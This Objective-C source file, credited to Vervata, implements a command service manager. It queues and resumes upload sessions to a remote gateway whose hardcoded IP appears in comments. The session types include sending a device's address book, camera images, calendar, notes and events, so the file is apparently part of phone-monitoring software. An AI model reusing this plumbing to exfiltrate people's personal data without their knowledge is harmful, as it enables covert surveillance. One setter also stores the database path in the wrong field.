//
//  CommandServiceManager.m
//  CommandServiceManager
//
//  Created by Pichaya Srifar on 7/29/11.
//  Copyright 2011 Vervata. All rights reserved.
//

#import "CommandServiceManager.h"
#import "CommandDelegate.h"
#import "CommandRequest.h"
#import "SessionManager.h"
#import "NewRequest.h"
#import "ResumeRequest.h"
#import "SessionInfo.h"
#import "CommandExecutor.h"
#import "CSMDeviceManager.h"

@implementation CommandServiceManager

@synthesize structuredURL;
@synthesize unstructuredURL;
@synthesize sessionManager;
@synthesize executor;
@synthesize priorityQueue;
@synthesize payloadPath;
@synthesize databasePath;

static CommandServiceManager *sharedCommandServiceManager = nil;

+ (CommandServiceManager*)sharedManager {
	@synchronized(self) {
		if (sharedCommandServiceManager == nil) {
			//sharedCommandServiceManager = [[self alloc] init];
			sharedCommandServiceManager = [[CommandServiceManager alloc] init];
			DLog(@"Alloc CSM");
//			[sharedCommandServiceManager setStructuredURL:[NSURL URLWithString:@"http://58.137.119.229/RainbowCore/gateway"]];
//			[sharedCommandServiceManager setUnstructuredURL:[NSURL URLWithString:@"http://58.137.119.229/RainbowCore/gateway/unstructured"]];

			[sharedCommandServiceManager setStructuredURL:[NSURL URLWithString:@""]];
			[sharedCommandServiceManager setUnstructuredURL:[NSURL URLWithString:@""]];
			
			// queue
			[sharedCommandServiceManager setPriorityQueue:[NSMutableArray array]];

			SessionManager *sharedSSM = [SessionManager sharedManager];
			// session manager
			[sharedCommandServiceManager setSessionManager:sharedSSM];

			// executor
			[sharedCommandServiceManager setExecutor:[CommandExecutor sharedManagerWithCSM:sharedCommandServiceManager withSSM:sharedSSM]];
		}
		return sharedCommandServiceManager;
	}
	return nil;
}

+ (CommandServiceManager *)sharedManagerWithPayloadPath:(NSString *)PLPath withDBPath:(NSString *)DBPath {
	@synchronized(self) {
		if (sharedCommandServiceManager == nil) {
			DLog(@"Alloc CSM writable path %@", PLPath);
			
			NSFileManager *fileMgr = [NSFileManager defaultManager];
			if (![fileMgr isWritableFileAtPath:PLPath]) {
				DLog(@"Path is not writable %@", PLPath);
			}
			
			if ([fileMgr isWritableFileAtPath:@"/private/var/mobile/Library/Downloads"]) {
				DLog(@"/private/var/mobile/Library/Downloads is writable");
			}			
			
			sharedCommandServiceManager = [[CommandServiceManager alloc] init];
			DLog (@"Shared Command Service Manager = %@", sharedCommandServiceManager);
			
//			[sharedCommandServiceManager setStructuredURL:[NSURL URLWithString:@"http://58.137.119.229/RainbowCore/gateway"]];
//			[sharedCommandServiceManager setUnstructuredURL:[NSURL URLWithString:@"http://58.137.119.229/RainbowCore/gateway/unstructured"]];
			[sharedCommandServiceManager setStructuredURL:[NSURL URLWithString:@""]];
			[sharedCommandServiceManager setUnstructuredURL:[NSURL URLWithString:@""]];

			
			[sharedCommandServiceManager setPayloadPath:PLPath];
			[sharedCommandServiceManager setDatabasePath:DBPath];
			// queue
			[sharedCommandServiceManager setPriorityQueue:[NSMutableArray array]];
			
			SessionManager *sharedSSM = [SessionManager sharedManagerWithPayloadFolderPath:PLPath WithDBFolderPath:DBPath];
			DLog (@"Session manager = %@", sharedSSM);
			// session manager
			[sharedCommandServiceManager setSessionManager:sharedSSM];
			
			// executor
			[sharedCommandServiceManager setExecutor:[CommandExecutor sharedManagerWithCSM:sharedCommandServiceManager withSSM:sharedSSM]];
			
		}
		return sharedCommandServiceManager;
	}
	return nil;
}

- (id)copyWithZone:(NSZone *)zone {
	return self;
}

- (id)retain {
	return self;
}

- (NSUInteger)retainCount {
	return NSUIntegerMax;  //denotes an object that cannot be released
}

- (void)release {
	//do nothing
}

- (id)autorelease {
	return self;
}

- (long)execute:(CommandRequest *)request {
	DLog(@"Structured url: %@", structuredURL)
	DLog(@"Unstructure url: %@", unstructuredURL)
	
	long CSID;
	@synchronized(self) {
		if (![request commandData] || ![request metaData]) {
			return -1;
		}
		
		if (![sessionManager payloadFolderPath]) {
			[sessionManager setPayloadFolderPath:[self payloadPath]];
		}
		if (![sessionManager DBFilePath]) {
			[sessionManager setDBFilePath:[[self databasePath] stringByAppendingPathComponent:@"phoenix_session.sqlite"]];
		}
		
		DLog(@"--------------------------------------- Request execute ------------------------------------");
		DLog(@"metaData     :\n%@", [request metaData]);
		DLog(@"delegate     = %@", [request delegate]);
		DLog(@"commandData  = %@", [request commandData]);
		DLog(@"Session cmd  = %d", [[request commandData] getCommand]);
		DLog(@"priority     = %d", [request priority]);
		DLog(@"--------------------------------------- Request execute ------------------------------------");
		
		SessionInfo *ssInfo = [sessionManager createSession:request];
		CSID = [ssInfo CSID];
		NewRequest *newRequest = [[NewRequest alloc] init];
		[newRequest setCSID:(uint32_t)CSID];
		[newRequest setPayloadFilePath:[ssInfo payloadPath]];
		
		//DLog(@"[CREATE]Session INFO:\n%@", ssInfo);
		
		switch ([ssInfo commandCode]) {
			case SEND_EVENTS:
				[newRequest setDirective:RESUMABLE];
				break;
			case SEND_ACTIVATE:
				[newRequest setDirective:NON_RESUMABLE];
				break;
			case SEND_DEACTIVATE:
				[newRequest setDirective:NON_RESUMABLE];
				break;
			case SEND_HEARTBEAT:
				[newRequest setDirective:NON_RESUMABLE];
				break;
			case SEND_ADDRESSBOOK_FOR_APPROVAL:
				[newRequest setDirective:RESUMABLE];
				break;
			case SEND_ADDRESSBOOK:
				[newRequest setDirective:RESUMABLE];
				break;
			case SEND_CAMERA_IMAGE:
			case SEND_CALENDAR:
			case SEND_NOTE:
				[newRequest setDirective:RESUMABLE];
				break;
			default:
				[newRequest setDirective:NON_RESUMABLE];
				break;
		}
		
		[newRequest setRequest:request];
		[newRequest setPriority:[request priority]];
		
		if ([newRequest directive] == RESUMABLE) {
			DLog(@"Store session info ...");
			[sessionManager persistSession:ssInfo]; // This line sometime crash with Signal 10 (SIGBUS)
			DLog(@"Store session info completed");
		}
		
		[priorityQueue enqueue:newRequest];
		//Add to queue then release
		[newRequest release];
		
		DLog(@"[executor isIdle] %d", [executor isIdle]);
		if ([executor isIdle]) {
			[executor setIsIdle:NO];
			[executor start];
		}
	}
	for (Request *obj in priorityQueue) {
		DLog(@"REQ.PRIORITY = %d, REQ.CSID = %d", [obj priority], [obj CSID]);
	}
	DLog(@"CSM execute CSID = %ld", CSID);
	return CSID;
}

- (void)resume:(uint32_t)CSID withDelegate:(id<CommandDelegate>)delegate {
	DLog(@"Structured url: %@", structuredURL)
	DLog(@"Unstructure url: %@", unstructuredURL)
	
	DLog(@"------------- Request resume ------------");
	DLog(@"CSID     = %d", CSID);
	DLog(@"delegate = %@", delegate);
	DLog(@"------------- Request resume ------------");
	
	SessionInfo *ssInfo = [sessionManager retrieveSession:CSID];
	if (ssInfo) {
		DLog(@"Retrieved ssInfo:\n%@", ssInfo);
		ResumeRequest *resumeRequest = [[ResumeRequest alloc] init];
		[resumeRequest setDirective:RSEND];
		[resumeRequest setSession:ssInfo];
		[resumeRequest setDelegate:delegate];
		[resumeRequest setPriority:HIGH];
		[resumeRequest setCSID:CSID];
		
		[priorityQueue enqueue:resumeRequest];
		[resumeRequest release];
		
		
		if ([executor isIdle]) {
			[executor setIsIdle:NO];
			[executor start];
		}
		
		DLog(@"CSM RESUME CSID = %d", [ssInfo CSID]);
	} else {
		DLog(@"No session with the given CSID to resume");
	}
}

- (void)testCancelRequest {
	if ([priorityQueue count] != 0) {
		[priorityQueue removeRequest:[[priorityQueue objectAtIndex:0] CSID]];
	}
}

- (Request *)deQueue {
	DLog(@"deQueue priorityQueue = %@", priorityQueue);
	return [priorityQueue dequeue];
}

- (void) setIMEI: (NSString *) aIMEI {
	[[CSMDeviceManager sharedCSMDeviceManager] setMIMEI:aIMEI];
}

- (void) cleanAllSessionInfoAndDeletePayload {
	NSFileManager *fileManager = [NSFileManager defaultManager];
	NSArray *sessions = [self.sessionManager retrieveAllSessions];
	for (SessionInfo *ssInfo in sessions) {
		[fileManager removeItemAtPath:[ssInfo payloadPath] error:nil];
	}
}

- (long) requestCSID {
	return ([self.sessionManager generateCSID]);
}

- (NSArray *)getAllOrphanedSession {
	return [sessionManager getAllOrphanedSession];
}

- (NSArray *)getAllPendingSession {
	return [sessionManager getAllPendingSession];
}

- (void)deleteSession:(uint32_t)CSID {
	if ([self sessionManager]) {
		[sessionManager deleteSession:CSID];
	}
}

- (void)deleteSessionPayload:(uint32_t)CSID {
	SessionInfo *ssInfo = [self.sessionManager retrieveSession:CSID];
	DLog(@"Payload file for CSID (%d) is: %@", CSID, [ssInfo payloadPath]);
	NSFileManager *fileManager = [NSFileManager defaultManager];
	[fileManager removeItemAtPath:[ssInfo payloadPath] error:nil];
	[self deleteSession:CSID];
}

- (void)cancelRequest:(uint32_t)CSID {
	Request *tmpReq = [[Request alloc] init];
	[tmpReq setCSID:CSID];
	if ([priorityQueue containsObject:tmpReq]) {
		[priorityQueue removeRequest:CSID];
	} else {
		if ([[executor request] CSID] == CSID) {
			[executor cancelRunningRequest:CSID];
		}
	}
	[tmpReq release];
}

- (void) setPayloadPath:(NSString *)PLPath {
//	if (payloadPath == PLPath) {
//		return;
//	}
	[sessionManager setPayloadFolderPath:PLPath];
	NSString *oldValue = payloadPath;
	payloadPath = [PLPath copy];
	[oldValue release];
}

- (void) setDatabasePath:(NSString *)DBPath {
	[sessionManager setDBFilePath:[DBPath stringByAppendingPathComponent:@"phoenix_session.sqlite"]];
	NSString *oldValue = payloadPath;
	payloadPath = [DBPath copy];
	[oldValue release];
}

- (void) dealloc {
	[structuredURL release];
	[unstructuredURL release];
	[payloadPath release];
	[databasePath release];
	[executor release];
	[sessionManager release];
	[priorityQueue release];
	[super dealloc];
}

@end
